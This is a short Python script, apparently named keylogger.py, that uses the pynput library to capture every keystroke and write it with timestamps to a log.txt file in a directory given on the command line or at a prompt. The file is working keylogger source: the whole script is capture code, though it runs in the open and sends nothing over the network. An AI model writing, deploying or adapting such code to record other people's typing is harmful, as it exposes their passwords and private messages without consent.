import logging
import os
import sys
import time
from os.path import exists
from pynput.keyboard import Listener


def validDir(dir):
    if dir[-1] != "/":  # adds '/' to the end of the directory if it's not already there TEST WITH \ LATER
        dir += "/"
    if exists(dir + "log.txt"):
        response = input("File already exists! Are you sure you would like to overwrite it? Y or N ")
        if response.lower() == "y":
            print("Permission granted! Continuing...")
        else:
            print("No permission granted. Exiting...")
            time.sleep(3)
            sys.exit()
    try:
        f = open(dir + "log.txt", "a")
        f.write("test data")
        f.close()
        os.remove(dir + "log.txt")
    except Exception:
        print("Error while writing log file! (likely due to permissions)")
        print("Exiting...")
        time.sleep(3)
        sys.exit()
    return dir + "log.txt"


def on_press(key):
    logging.info(str(key))


try:  # checks if arguments were provided, if not then error is set to True
    sys.argv[1] and sys.argv[2]
except Exception:
    error = True
else:
    error = False

if error == False and sys.argv[1] in ["-h", "--h", "-help", "--help"]:  # if args were provided and the first one is
    # in help related flags, then print help
    print("usage: python3 keylogger.py --output {directory}")

elif error == False and sys.argv[1] in ["-o", "-output", "--o", "--output"]:  # if args were provided and the first
    # one is in output related flags, then validate the second arg
    userDirectory = validDir(sys.argv[2])
    logging.basicConfig(filename=userDirectory, level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    with Listener(on_press=on_press) as listener:
        listener.join()
else:
    print("Sufficient arguments were not provided!")
    userDirectory = validDir(input("Where would you like to write the log file 'log.txt'? "))
    logging.basicConfig(filename=userDirectory, level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    with Listener(on_press=on_press) as listener:
        listener.join()
